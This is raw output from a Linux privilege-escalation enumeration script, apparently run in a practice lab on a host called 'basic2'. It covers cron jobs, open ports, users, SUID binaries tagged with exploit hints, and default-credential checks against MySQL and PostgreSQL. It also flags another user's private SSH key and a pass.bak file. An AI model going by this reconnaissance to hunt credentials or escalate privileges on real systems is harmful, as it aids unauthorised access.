 72K <span class="nt">-rwxr-xr-x</span> 1 root root  71K Mar  7  2018 /usr/sbin/smbd
776K <span class="nt">-rwxr-xr-x</span> 1 root root 773K Jan 18  2018 /usr/sbin/sshd

<span class="o">[</span>+] Cron <span class="nb">jobs</span>
<span class="o">[</span>i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#scheduled-jobs                                 
<span class="nt">-rw-r--r--</span> 1 root root  722 Apr  5  2016 /etc/crontab                                                          

/etc/cron.d:
total 20
drwxr-xr-x  2 root root 4096 Apr 17  2018 <span class="nb">.</span>
drwxr-xr-x 99 root root 4096 Nov 15  2018 ..
<span class="nt">-rw-r--r--</span>  1 root root  589 Jul 16  2014 mdadm
<span class="nt">-rw-r--r--</span>  1 root root  102 Apr  5  2016 .placeholder
<span class="nt">-rw-r--r--</span>  1 root root  190 Apr 17  2018 popularity-contest

/etc/cron.daily:
total 64
drwxr-xr-x  2 root root 4096 Apr 19  2018 <span class="nb">.</span>
drwxr-xr-x 99 root root 4096 Nov 15  2018 ..
<span class="nt">-rwxr-xr-x</span>  1 root root  539 Apr  5  2016 apache2
<span class="nt">-rwxr-xr-x</span>  1 root root  376 Mar 31  2016 apport
<span class="nt">-rwxr-xr-x</span>  1 root root 1474 Jun 19  2017 apt-compat
<span class="nt">-rwxr-xr-x</span>  1 root root  355 May 22  2012 bsdmainutils
<span class="nt">-rwxr-xr-x</span>  1 root root 1597 Nov 26  2015 dpkg
<span class="nt">-rwxr-xr-x</span>  1 root root  372 May  6  2015 logrotate
<span class="nt">-rwxr-xr-x</span>  1 root root 1293 Nov  6  2015 man-db
<span class="nt">-rwxr-xr-x</span>  1 root root  539 Jul 16  2014 mdadm
<span class="nt">-rwxr-xr-x</span>  1 root root  435 Nov 18  2014 mlocate
<span class="nt">-rwxr-xr-x</span>  1 root root  249 Nov 12  2015 passwd
<span class="nt">-rw-r--r--</span>  1 root root  102 Apr  5  2016 .placeholder
<span class="nt">-rwxr-xr-x</span>  1 root root 3449 Feb 26  2016 popularity-contest
<span class="nt">-rwxr-xr-x</span>  1 root root  383 Mar  7  2016 samba
<span class="nt">-rwxr-xr-x</span>  1 root root  214 May 24  2016 update-notifier-common

/etc/cron.hourly:
total 12
drwxr-xr-x  2 root root 4096 Apr 17  2018 <span class="nb">.</span>
drwxr-xr-x 99 root root 4096 Nov 15  2018 ..
<span class="nt">-rw-r--r--</span>  1 root root  102 Apr  5  2016 .placeholder

/etc/cron.monthly:
total 12
drwxr-xr-x  2 root root 4096 Apr 17  2018 <span class="nb">.</span>
drwxr-xr-x 99 root root 4096 Nov 15  2018 ..
<span class="nt">-rw-r--r--</span>  1 root root  102 Apr  5  2016 .placeholder

/etc/cron.weekly:
total 24
drwxr-xr-x  2 root root 4096 Apr 17  2018 <span class="nb">.</span>
drwxr-xr-x 99 root root 4096 Nov 15  2018 ..
<span class="nt">-rwxr-xr-x</span>  1 root root   86 Apr 13  2016 fstrim
<span class="nt">-rwxr-xr-x</span>  1 root root  771 Nov  6  2015 man-db
<span class="nt">-rw-r--r--</span>  1 root root  102 Apr  5  2016 .placeholder
<span class="nt">-rwxr-xr-x</span>  1 root root  211 May 24  2016 update-notifier-common

<span class="nv">SHELL</span><span class="o">=</span>/bin/sh
<span class="nv">PATH</span><span class="o">=</span>/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin


<span class="o">[</span>+] Services
<span class="o">[</span>i] Search <span class="k">for </span>outdated versions                                                                               
 <span class="o">[</span> + <span class="o">]</span>  acpid                                                                                                  
 <span class="o">[</span> + <span class="o">]</span>  apache-htcacheclean
 <span class="o">[</span> + <span class="o">]</span>  apache2
 <span class="o">[</span> + <span class="o">]</span>  apparmor
 <span class="o">[</span> + <span class="o">]</span>  apport
 <span class="o">[</span> + <span class="o">]</span>  atd
 <span class="o">[</span> - <span class="o">]</span>  bootmisc.sh
 <span class="o">[</span> - <span class="o">]</span>  checkfs.sh
 <span class="o">[</span> - <span class="o">]</span>  checkroot-bootclean.sh
 <span class="o">[</span> - <span class="o">]</span>  checkroot.sh
 <span class="o">[</span> + <span class="o">]</span>  console-setup
 <span class="o">[</span> + <span class="o">]</span>  cron
 <span class="o">[</span> - <span class="o">]</span>  cryptdisks
 <span class="o">[</span> - <span class="o">]</span>  cryptdisks-early
 <span class="o">[</span> + <span class="o">]</span>  dbus
 <span class="o">[</span> + <span class="o">]</span>  grub-common
 <span class="o">[</span> - <span class="o">]</span>  hostname.sh
 <span class="o">[</span> - <span class="o">]</span>  hwclock.sh
 <span class="o">[</span> + <span class="o">]</span>  irqbalance
 <span class="o">[</span> + <span class="o">]</span>  iscsid
 <span class="o">[</span> + <span class="o">]</span>  keyboard-setup
 <span class="o">[</span> - <span class="o">]</span>  killprocs
 <span class="o">[</span> + <span class="o">]</span>  kmod
 <span class="o">[</span> - <span class="o">]</span>  lvm2
 <span class="o">[</span> + <span class="o">]</span>  lvm2-lvmetad
 <span class="o">[</span> + <span class="o">]</span>  lvm2-lvmpolld
 <span class="o">[</span> + <span class="o">]</span>  lxcfs
 <span class="o">[</span> - <span class="o">]</span>  lxd
 <span class="o">[</span> + <span class="o">]</span>  mdadm
 <span class="o">[</span> - <span class="o">]</span>  mdadm-waitidle
 <span class="o">[</span> - <span class="o">]</span>  mountall-bootclean.sh
 <span class="o">[</span> - <span class="o">]</span>  mountall.sh
 <span class="o">[</span> - <span class="o">]</span>  mountdevsubfs.sh
 <span class="o">[</span> - <span class="o">]</span>  mountkernfs.sh
 <span class="o">[</span> - <span class="o">]</span>  mountnfs-bootclean.sh
 <span class="o">[</span> - <span class="o">]</span>  mountnfs.sh
 <span class="o">[</span> + <span class="o">]</span>  networking
 <span class="o">[</span> + <span class="o">]</span>  nmbd
 <span class="o">[</span> + <span class="o">]</span>  ondemand
 <span class="o">[</span> + <span class="o">]</span>  open-iscsi
 <span class="o">[</span> - <span class="o">]</span>  open-vm-tools
 <span class="o">[</span> - <span class="o">]</span>  plymouth
 <span class="o">[</span> - <span class="o">]</span>  plymouth-log
 <span class="o">[</span> + <span class="o">]</span>  procps
 <span class="o">[</span> + <span class="o">]</span>  rc.local
 <span class="o">[</span> + <span class="o">]</span>  resolvconf
 <span class="o">[</span> - <span class="o">]</span>  rsync
 <span class="o">[</span> + <span class="o">]</span>  rsyslog
 <span class="o">[</span> + <span class="o">]</span>  samba
 <span class="o">[</span> + <span class="o">]</span>  samba-ad-dc
 <span class="o">[</span> - <span class="o">]</span>  screen-cleanup
 <span class="o">[</span> - <span class="o">]</span>  sendsigs
 <span class="o">[</span> + <span class="o">]</span>  smbd
 <span class="o">[</span> + <span class="o">]</span>  ssh
 <span class="o">[</span> + <span class="o">]</span>  udev
 <span class="o">[</span> + <span class="o">]</span>  ufw
 <span class="o">[</span> - <span class="o">]</span>  umountfs
 <span class="o">[</span> - <span class="o">]</span>  umountnfs.sh
 <span class="o">[</span> - <span class="o">]</span>  umountroot
 <span class="o">[</span> + <span class="o">]</span>  unattended-upgrades
 <span class="o">[</span> + <span class="o">]</span>  urandom
 <span class="o">[</span> - <span class="o">]</span>  uuidd
 <span class="o">[</span> - <span class="o">]</span>  x11-common


<span class="o">===================================(</span> Network Information <span class="o">)====================================</span>
<span class="o">[</span>+] Hostname, hosts and DNS                                                                                    
basic2                                                                                                         
127.0.0.1       localhost
127.0.1.1       basic2

::1     localhost ip6-localhost ip6-loopback
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
nameserver 10.0.0.2
search eu-west-1.compute.internal

<span class="o">[</span>+] Content of /etc/inetd.conf
/etc/inetd.conf Not Found                                                                                      
                                                                                                               
<span class="o">[</span>+] Networks and neighbours
<span class="c"># symbolic names for networks, see networks(5) for more information                                            </span>
link-local 169.254.0.0
eth0      Link encap:Ethernet  HWaddr 02:c6:6a:4e:79:1b  
          inet addr:10.10.131.121  Bcast:10.10.255.255  Mask:255.255.0.0
          inet6 addr: fe80::c6:6aff:fe4e:791b/64 Scope:Link
          UP BROADCAST RUNNING MULTICAST  MTU:9001  Metric:1
          RX packets:17812 errors:0 dropped:0 overruns:0 frame:0
          TX packets:17854 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:1000 
          RX bytes:2557460 <span class="o">(</span>2.5 MB<span class="o">)</span>  TX bytes:4664918 <span class="o">(</span>4.6 MB<span class="o">)</span>

lo        Link encap:Local Loopback  
          inet addr:127.0.0.1  Mask:255.0.0.0
          inet6 addr: ::1/128 Scope:Host
          UP LOOPBACK RUNNING  MTU:65536  Metric:1
          RX packets:192 errors:0 dropped:0 overruns:0 frame:0
          TX packets:192 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:1 
          RX bytes:14256 <span class="o">(</span>14.2 KB<span class="o">)</span>  TX bytes:14256 <span class="o">(</span>14.2 KB<span class="o">)</span>

10.10.0.1 dev eth0 lladdr 02:c8:85:b5:5a:aa REACHABLE
Kernel IP routing table
Destination     Gateway         Genmask         Flags Metric Ref    Use Iface
0.0.0.0         10.10.0.1       0.0.0.0         UG    0      0        0 eth0
10.10.0.0       0.0.0.0         255.255.0.0     U     0      0        0 eth0

<span class="o">[</span>+] Iptables rules
iptables rules Not Found                                                                                       
                                                                                                               
<span class="o">[</span>+] Active Ports
<span class="o">[</span>i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#internal-open-ports                            
Active Internet connections <span class="o">(</span>servers and established<span class="o">)</span>                                                          
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
tcp        0      0 0.0.0.0:22              0.0.0.0:<span class="k">*</span>               LISTEN      -               
tcp        0      0 0.0.0.0:445             0.0.0.0:<span class="k">*</span>               LISTEN      -               
tcp        0      0 0.0.0.0:139             0.0.0.0:<span class="k">*</span>               LISTEN      -               
tcp        0   4788 10.10.131.121:22        10.8.32.129:34902       ESTABLISHED -               
tcp6       0      0 :::22                   :::<span class="k">*</span>                    LISTEN      -               
tcp6       0      0 :::445                  :::<span class="k">*</span>                    LISTEN      -               
tcp6       0      0 127.0.0.1:8005          :::<span class="k">*</span>                    LISTEN      -               
tcp6       0      0 :::8009                 :::<span class="k">*</span>                    LISTEN      -               
tcp6       0      0 :::139                  :::<span class="k">*</span>                    LISTEN      -               
tcp6       0      0 :::8080                 :::<span class="k">*</span>                    LISTEN      -               
tcp6       0      0 :::80                   :::<span class="k">*</span>                    LISTEN      -               
udp        0      0 10.10.255.255:137       0.0.0.0:<span class="k">*</span>                           -               
udp        0      0 10.10.131.121:137       0.0.0.0:<span class="k">*</span>                           -               
udp        0      0 0.0.0.0:137             0.0.0.0:<span class="k">*</span>                           -               
udp        0      0 10.10.255.255:138       0.0.0.0:<span class="k">*</span>                           -               
udp        0      0 10.10.131.121:138       0.0.0.0:<span class="k">*</span>                           -               
udp        0      0 0.0.0.0:138             0.0.0.0:<span class="k">*</span>                           -               
udp        0      0 0.0.0.0:68              0.0.0.0:<span class="k">*</span>                           -               

<span class="o">[</span>+] Can I sniff with tcpdump?
No                                                                                                             
                                                                                                               

<span class="o">====================================(</span> Users Information <span class="o">)=====================================</span>
<span class="o">[</span>+] My user                                                                                                    
<span class="o">[</span>i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#groups                                         
<span class="nv">uid</span><span class="o">=</span>1001<span class="o">(</span>jan<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1001<span class="o">(</span>jan<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>1001<span class="o">(</span>jan<span class="o">)</span>                                                                   

<span class="o">[</span>+] Do I have PGP keys?
gpg Not Found                                                                                                  
                                                                                                               
<span class="o">[</span>+] Clipboard or highlighted text?
xsel and xclip Not Found                                                                                       
                                                                                                               
<span class="o">[</span>+] Testing <span class="s1">'sudo -l'</span> without password &amp; /etc/sudoers
<span class="o">[</span>i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#commands-with-sudo-and-suid-commands           
                                                                                                               
<span class="o">[</span>+] Checking /etc/doas.conf
/etc/doas.conf Not Found                                                                                       
                                                                                                               
<span class="o">[</span>+] Checking Pkexec policy
                                                                                                               
<span class="o">[</span>Configuration]
<span class="nv">AdminIdentities</span><span class="o">=</span>unix-user:0
<span class="o">[</span>Configuration]
<span class="nv">AdminIdentities</span><span class="o">=</span>unix-group:sudo<span class="p">;</span>unix-group:admin

<span class="o">[</span>+] Don forget to <span class="nb">test</span> <span class="s1">'su'</span> as any other user with shell: without password and with their names as password <span class="o">(</span>I can<span class="s1">'t do it...)                                                                                                
[+] Do not forget to execute '</span><span class="nb">sudo</span> <span class="nt">-l</span><span class="s1">' without password or with valid password (if you know it)!!              
                                                                                                               
[+] Superusers
root:x:0:0:root:/root:/bin/bash                                                                                

[+] Users with console
jan:x:1001:1001::/home/jan:/bin/bash                                                                           
kay:x:1000:1000:Kay,,,:/home/kay:/bin/bash
root:x:0:0:root:/root:/bin/bash

[+] Login information
 09:15:50 up 35 min,  1 user,  load average: 0.01, 0.05, 0.14                                                  
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
jan      pts/0    10.8.32.129      09:15    6.00s  0.02s  0.00s w
kay      tty1                          Wed Apr 18 09:20 - down   (00:05)
reboot   system boot  4.4.0-119-generi Tue Apr 17 13:45 - 09:25  (19:39)
kay      tty1                          Wed Apr 18 09:02 - crash  (-19:-16)
reboot   system boot  4.4.0-119-generi Tue Apr 17 13:27 - 09:25  (19:58)
kay      tty1                          Tue Apr 17 13:21 - crash  (00:05)
reboot   system boot  4.4.0-119-generi Tue Apr 17 13:14 - 09:25  (20:10)
kay      tty1                          Tue Apr 17 13:05 - down   (00:08)
reboot   system boot  4.4.0-87-generic Tue Apr 17 13:00 - 13:14  (00:14)

wtmp begins Tue Apr 17 13:00:02 2018

[+] All users
_apt                                                                                                           
backup
bin
daemon
dnsmasq
games
gnats
irc
jan
kay
list
lp
lxd
mail
man
messagebus
news
nobody
proxy
root
sshd
sync
syslog
systemd-bus-proxy
systemd-network
systemd-resolve
systemd-timesync
sys
tomcat9
uucp
uuidd
www-data

[+] Password policy
PASS_MAX_DAYS   99999                                                                                          
PASS_MIN_DAYS   0
PASS_WARN_AGE   7
ENCRYPT_METHOD SHA512


===================================( Software Information )===================================
[+] MySQL version                                                                                              
mysql Not Found                                                                                                
                                                                                                               
[+] MySQL connection using default root/root ........... No
[+] MySQL connection using root/toor ................... No                                                    
[+] MySQL connection using root/NOPASS ................. No                                                    
[+] Looking for mysql credentials and exec                                                                     
 Not Found                                                                                                     
                                                                                                               
[+] PostgreSQL version and pgadmin credentials
 Not Found                                                                                                     
                                                                                                               
[+] PostgreSQL connection to template0 using postgres/NOPASS ........ No
[+] PostgreSQL connection to template1 using postgres/NOPASS ........ No                                       
[+] PostgreSQL connection to template0 using pgsql/NOPASS ........... No                                       
[+] PostgreSQL connection to template1 using pgsql/NOPASS ........... No                                       
                                                                                                               
[+] Apache server info
Version: Server version: Apache/2.4.18 (Ubuntu)                                                                
Server built:   2017-09-18T15:09:02

[+] Looking for PHPCookies
 Not Found                                                                                                     
                                                                                                               
[+] Looking for Wordpress wp-config.php files
wp-config.php Not Found                                                                                        
                                                                                                               
[+] Looking for Tomcat users file
tomcat-users.xml Not Found                                                                                     
                                                                                                               
[+] Mongo information
 Not Found                                                                                                     
                                                                                                               
[+] Looking for supervisord configuration file
supervisord.conf Not Found                                                                                     
                                                                                                               
[+] Looking for cesi configuration file
cesi.conf Not Found                                                                                            
                                                                                                               
[+] Looking for Rsyncd config file
/usr/share/doc/rsync/examples/rsyncd.conf                                                                      
[ftp]
        comment = public archive
        path = /var/www/pub
        use chroot = yes
        lock file = /var/lock/rsyncd
        read only = yes
        list = yes
        uid = nobody
        gid = nogroup
        strict modes = yes
        ignore errors = no
        ignore nonreadable = yes
        transfer logging = no
        timeout = 600
        refuse options = checksum dry-run
        dont compress = *.gz *.tgz *.zip *.z *.rpm *.deb *.iso *.bz2 *.tbz

[+] Looking for Hostapd config file
hostapd.conf Not Found                                                                                         
                                                                                                               
[+] Looking for wifi conns file
 Not Found                                                                                                     
                                                                                                               
[+] Looking for Anaconda-ks config files
anaconda-ks.cfg Not Found                                                                                      
                                                                                                               
[+] Looking for .vnc directories and their passwd files
.vnc Not Found                                                                                                 
                                                                                                               
[+] Looking for ldap directories and their hashes
/etc/ldap                                                                                                      
The password hash is from the {SSHA} to '</span>structural<span class="s1">'

[+] Looking for .ovpn files and credentials
.ovpn Not Found                                                                                                
                                                                                                               
[+] Looking for ssl/ssh files
/home/kay/.ssh/authorized_keys                                                                                 
/home/kay/.ssh/id_rsa
/home/kay/.ssh/id_rsa.pub
Port 22
PermitRootLogin prohibit-password
PubkeyAuthentication yes
PermitEmptyPasswords no
ChallengeResponseAuthentication no
UsePAM yes
Private SSH keys found!:
/home/kay/.ssh/id_rsa

Looking inside /etc/ssh/ssh_config for interesting info
Host *
    SendEnv LANG LC_*
    HashKnownHosts yes
    GSSAPIAuthentication yes
    GSSAPIDelegateCredentials no

[+] Looking for unexpected auth lines in /etc/pam.d/sshd
No                                                                                                             
                                                                                                               
[+] Looking for Cloud credentials (AWS, Azure, GC)
                                                                                                               
[+] NFS exports?
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation/nfs-no_root_squash-misconfiguration-pe         
/etc/exports Not Found                                                                                         
                                                                                                               
[+] Looking for kerberos conf files and tickets
[i] https://book.hacktricks.xyz/pentesting/pentesting-kerberos-88#pass-the-ticket-ptt                          
krb5.conf Not Found                                                                                            
tickets kerberos Not Found                                                                                     
klist Not Found                                                                                                
                                                                                                               
[+] Looking for Kibana yaml
kibana.yml Not Found                                                                                           
                                                                                                               
[+] Looking for logstash files
 Not Found                                                                                                     
                                                                                                               
[+] Looking for elasticsearch files
 Not Found                                                                                                     
                                                                                                               
[+] Looking for Vault-ssh files
vault-ssh-helper.hcl Not Found                                                                                 
                                                                                                               
[+] Looking for AD cached hahses
/var/lib/samba/private/secrets.tdb                                                                             

[+] Looking for screen sessions
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#open-shell-sessions                            
No Sockets found in /var/run/screen/S-jan.                                                                     

[+] Looking for tmux sessions
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#open-shell-sessions                            
tmux Not Found                                                                                                 
                                                                                                               
[+] Looking for Couchdb directory
                                                                                                               
[+] Looking for redis.conf
                                                                                                               
[+] Looking for dovecot files
dovecot credentials Not Found                                                                                  
                                                                                                               
[+] Looking for mosquitto.conf
                                                                                                               

====================================( Interesting Files )=====================================
[+] SUID                                                                                                       
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#commands-with-sudo-and-suid-commands           
/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic                                                                     
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/eject/dmcrypt-get-device
/usr/lib/snapd/snap-confine
/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/bin/vim.basic
/usr/bin/pkexec         ---&gt;    rhel_6/Also_check_groups_privileges_and_pkexec_policy
/usr/bin/newgrp         ---&gt;    HP-UX_10.20
/usr/bin/chfn           ---&gt;    SuSE_9.3/10
/usr/bin/sudo           ---&gt;    /sudo$
/usr/bin/chsh
/usr/bin/newgidmap
/usr/bin/at
/usr/bin/gpasswd
/usr/bin/newuidmap
/usr/bin/passwd         ---&gt;    Apple_Mac_OSX/Solaris/SPARC_8/9/Sun_Solaris_2.5.1_PAM
/bin/su
/bin/ntfs-3g            ---&gt;    Debian9/8/7/Ubuntu/Gentoo/others/Ubuntu_Server_16.10_and_others
/bin/ping6
/bin/umount             ---&gt;    BSD/Linux[1996-08-13]
/bin/fusermount
/bin/mount              ---&gt;    Apple_Mac_OSX(Lion)_Kernel_xnu-1699.32.7_except_xnu-1699.24.8
/bin/ping

[+] SGID
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#commands-with-sudo-and-suid-commands           
/sbin/unix_chkpwd                                                                                              
/sbin/pam_extrausers_chkpwd
/usr/lib/x86_64-linux-gnu/utempter/utempter
/usr/lib/snapd/snap-confine
/usr/bin/crontab
/usr/bin/bsd-write
/usr/bin/chage
/usr/bin/ssh-agent
/usr/bin/expiry
/usr/bin/wall
/usr/bin/screen         ---&gt;    GNU_Screen_4.5.0
/usr/bin/at
/usr/bin/mlocate

[+] Capabilities
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#capabilities                                   
/usr/bin/mtr = cap_net_raw+ep                                                                                  
/usr/bin/systemd-detect-virt = cap_dac_override,cap_sys_ptrace+ep
/usr/bin/traceroute6.iputils = cap_net_raw+ep

[+] .sh files in path
/usr/bin/gettext.sh                                                                                            

[+] Files (scripts) in /etc/profile.d/
total 24                                                                                                       
drwxr-xr-x  2 root root 4096 Apr 17  2018 .
drwxr-xr-x 99 root root 4096 Nov 15  2018 ..
-rw-r--r--  1 root root  580 Nov 30  2017 apps-bin-path.sh
-rw-r--r--  1 root root  663 May 18  2016 bash_completion.sh
-rw-r--r--  1 root root 1003 Dec 29  2015 cedilla-portuguese.sh
-rw-r--r--  1 root root 1557 Apr 14  2016 Z97-byobu.sh

[+] Hashes inside passwd file? ........... No
[+] Can I read shadow files? ........... No                                                                    
[+] Can I read root folder? ........... No                                                                     
                                                                                                               
[+] Looking for root files in home dirs (limit 20)
/home                                                                                                          
/home/jan
/home/jan/.lesshst
/home/kay/.viminfo
/home/kay/.lesshst

[+] Looking for root files in folders owned by me
-rw-r--r-- 1 root root 0 Apr 30 09:16 /var/lib/lxcfs/cgroup/name=systemd/user.slice/user-1001.slice/user@1001.service/cgroup.clone_children                                                                                   
-rw-r--r-- 1 root root 0 Apr 30 09:16 /var/lib/lxcfs/cgroup/name=systemd/user.slice/user-1001.slice/user@1001.service/notify_on_release                                                                                       
-rw-r--r-- 1 root root 0 Apr 30 09:16 /sys/fs/cgroup/systemd/user.slice/user-1001.slice/user@1001.service/cgroup.clone_children                                                                                               
-rw-r--r-- 1 root root 0 Apr 30 09:16 /sys/fs/cgroup/systemd/user.slice/user-1001.slice/user@1001.service/notify_on_release                                                                                                   

[+] Readable files belonging to root and readable by me but not world readable
                                                                                                               
[+] Files inside /home/jan (limit 20)
total 12                                                                                                       
drwxr-xr-x 2 root root 4096 Apr 23  2018 .
drwxr-xr-x 4 root root 4096 Apr 19  2018 ..
-rw------- 1 root jan    47 Apr 23  2018 .lesshst

[+] Files inside others home (limit 20)
/home/kay/.profile                                                                                             
/home/kay/.viminfo
/home/kay/.bashrc
/home/kay/.bash_history
/home/kay/.lesshst
/home/kay/.ssh/authorized_keys
/home/kay/.ssh/id_rsa
/home/kay/.ssh/id_rsa.pub
/home/kay/.bash_logout
/home/kay/.sudo_as_admin_successful
/home/kay/pass.bak

[+] Looking for installed mail applications
                                                                                                               
[+] Mails (limit 50)
                                                                                                               
[+] Backup files?
-rw-r--r-- 1 root root 128 Apr 17  2018 /var/lib/sgml-base/supercatalog.old                                    
-rw-r--r-- 1 root root 610 Apr 17  2018 /etc/xml/catalog.old
-rw-r--r-- 1 root root 673 Apr 17  2018 /etc/xml/xml-core.xml.old
-rw-r--r-- 1 root root 9542 Apr 19  2018 /etc/samba/smb.conf.bak
-rwxr-xr-x 1 root root 10504 Mar 14  2016 /usr/bin/tdbbackup.tdbtools

[+] Looking for tables inside readable .db/.sqlite files (limit 100)
 -&gt; Extracting tables from /var/lib/nssdb/key4.db (limit 20)                                                   
                                                                                                               
 -&gt; Extracting tables from /var/lib/nssdb/secmod.db (limit 20)
 -&gt; Extracting tables from /var/lib/nssdb/cert9.db (limit 20)                                                  
                                                                                                               

[+] Web files?(output limit)
/var/www/:                                                                                                     
total 12K
drwxr-xr-x  3 root root 4.0K Apr 18  2018 .
drwxr-xr-x 14 root root 4.0K Apr 18  2018 ..
drwxr-xr-x  3 root root 4.0K Apr 23  2018 html

/var/www/html:
total 16K
drwxr-xr-x 3 root     root     4.0K Apr 23  2018 .
drwxr-xr-x 3 root     root     4.0K Apr 18  2018 ..

[+] *_history, .sudo_as_admin_successful, profile, bashrc, httpd.conf, .plan, .htpasswd, .git-credentials, .gitconfig, .rhosts, hosts.equiv, Dockerfile, docker-compose.yml                                                   
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#read-sensitive-data                            
-rw-r--r-- 1 root root 2188 Aug 31  2015 /etc/bash.bashrc                                                      
-rw-r--r-- 1 root root 655 May 16  2017 /etc/skel/.profile
-rw-r--r-- 1 root root 3771 Aug 31  2015 /etc/skel/.bashrc
-rw-r--r-- 1 kay kay 655 Apr 17  2018 /home/kay/.profile
-rw-r--r-- 1 kay kay 3771 Apr 17  2018 /home/kay/.bashrc
-rw-r--r-- 1 kay kay 0 Apr 17  2018 /home/kay/.sudo_as_admin_successful
-rw-r--r-- 1 root root 3106 Oct 22  2015 /usr/share/base-files/dot.bashrc
-rw-r--r-- 1 root root 3161 Apr 14  2016 /usr/share/byobu/profiles/bashrc
-rw-r--r-- 1 root root 870 Jul  2  2015 /usr/share/doc/adduser/examples/adduser.local.conf.examples/bash.bashrc
-rw-r--r-- 1 root root 1865 Jul  2  2015 /usr/share/doc/adduser/examples/adduser.local.conf.examples/skel/dot.bashrc

[+] All hidden files (not in /sys/ or the ones listed in the previous check) (limit 70)
   798117      0 -rw-r--r--   1 root     root            0 Apr 18  2018 /etc/.java/.systemPrefs/.system.lock   
   798118      0 -rw-r--r--   1 root     root            0 Apr 18  2018 /etc/.java/.systemPrefs/.systemRootModFile
   786927      4 -rw-r--r--   1 root     root          220 Aug 31  2015 /etc/skel/.bash_logout
   786435      0 -rw-------   1 root     root            0 Aug  1  2017 /etc/.pwd.lock
   786494      4 -rw-r--r--   1 root     root         1391 Apr 17  2018 /etc/apparmor.d/cache/.features
      395      0 -rw-r--r--   1 root     root            0 Apr 30 08:41 /run/network/.ifstate.lock
    10038      4 -rw-r--r--   1 root     root         1319 Apr 17  2018 /var/lib/apparmor/profiles/.apparmor.md5sums
   532802      4 -rw-r--r--   1 root     root          155 Jul 18  2017 /usr/src/linux-headers-4.4.0-87-generic/arch/x86/purgatory/.kexec-purgatory.c.cmd
   532809      4 -rw-r--r--   1 root     root          333 Jul 18  2017 /usr/src/linux-headers-4.4.0-87-generic/arch/x86/purgatory/.purgatory.ro.cmd
   532806      4 -rw-r--r--   1 root     root         1374 Jul 18  2017 /usr/src/linux-headers-4.4.0-87-generic/arch/x86/purgatory/.setup-x86_64.o.cmd
   532804      4 -rw-r--r--   1 root     root         1304 Jul 18  2017 /usr/src/linux-headers-4.4.0-87-generic/arch/x86/purgatory/.stack.o.cmd
   532798     12 -rw-r--r--   1 root     root         9092 Jul 18  2017 /usr/src/linux-headers-4.4.0-87-generic/arch/x86/purgatory/.sha256.o.cmd
   532807      4 -rw-r--r--   1 root     root         3615 Jul 18  2017 /usr/src/linux-headers-4.4.0-87-generic/arch/x86/purgatory/.purgatory.o.cmd
   532800      4 -rw-r--r--   1 root     root         1324 Jul 18  2017 /usr/src/linux-headers-4.4.0-87-generic/arch/x86/purgatory/.entry64.o.cmd
   532812      4 -rw-r--r--   1 root     root         3529 Jul 18  2017 /usr/src/linux-headers-4.4.0-87-generic/arch/x86/purgatory/.string.o.cmd
   532820      4 -rw-r--r--   1 root     root          292 Jul 18  2017 /usr/src/linux-headers-4.4.0-87-generic/arch/x86/include/generated/asm/.syscalls_64.h.cmd
   532830      4 -rw-r--r--   1 root     root          292 Jul 18  2017 /usr/src/linux-headers-4.4.0-87-generic/arch/x86/include/generated/asm/.syscalls_32.h.cmd
   532821      4 -rw-r--r--   1 root     root          402 Jul 18  2017 /usr/src/linux-headers-4.4.0-87-generic/arch/x86/include/generated/asm/.xen-hypercalls.h.cmd
   532817      4 -rw-r--r--   1 root     root          316 Jul 18  2017 /usr/src/linux-headers-4.4.0-87-generic/arch/x86/include/generated/asm/.unistd_64_x32.h.cmd
   532828      4 -rw-r--r--   1 root     root          320 Jul 18  2017 /usr/src/linux-headers-4.4.0-87-generic/arch/x86/include/generated/asm/.unistd_32_ia32.h.cmd
   532840      4 -rw-r--r--   1 root     root          320 Jul 18  2017 /usr/src/linux-headers-4.4.0-87-generic/arch/x86/include/generated/uapi/asm/.unistd_64.h.cmd
   532838      4 -rw-r--r--   1 root     root          315 Jul 18  2017 /usr/src/linux-headers-4.4.0-87-generic/arch/x86/include/generated/uapi/asm/.unistd_32.h.cmd
   532835      4 -rw-r--r--   1 root     root          340 Jul 18  2017 /usr/src/linux-headers-4.4.0-87-generic/arch/x86/include/generated/uapi/asm/.unistd_x32.h.cmd
   532792      4 -rw-r--r--   1 root     root          146 Jul 18  2017 /usr/src/linux-headers-4.4.0-87-generic/arch/x86/tools/.relocs.cmd
   532793      4 -rw-r--r--   1 root     root         3342 Jul 18  2017 /usr/src/linux-headers-4.4.0-87-generic/arch/x86/tools/.relocs_common.o.cmd
   532788      4 -rw-r--r--   1 root     root         3362 Jul 18  2017 /usr/src/linux-headers-4.4.0-87-generic/arch/x86/tools/.relocs_32.o.cmd
   532789      4 -rw-r--r--   1 root     root         3362 Jul 18  2017 /usr/src/linux-headers-4.4.0-87-generic/arch/x86/tools/.relocs_64.o.cmd
   532842     56 -rw-r--r--   1 root     root        54037 Jul 18  2017 /usr/src/linux-headers-4.4.0-87-generic/arch/x86/kernel/.asm-offsets.s.cmd
   532845      4 -rw-r--r--   1 root     root           22 Jul 18  2017 /usr/src/linux-headers-4.4.0-87-generic/.21135.d
   532853      4 -rw-r--r--   1 root     root         3972 Jul 18  2017 /usr/src/linux-headers-4.4.0-87-generic/scripts/.insert-sys-cert.cmd
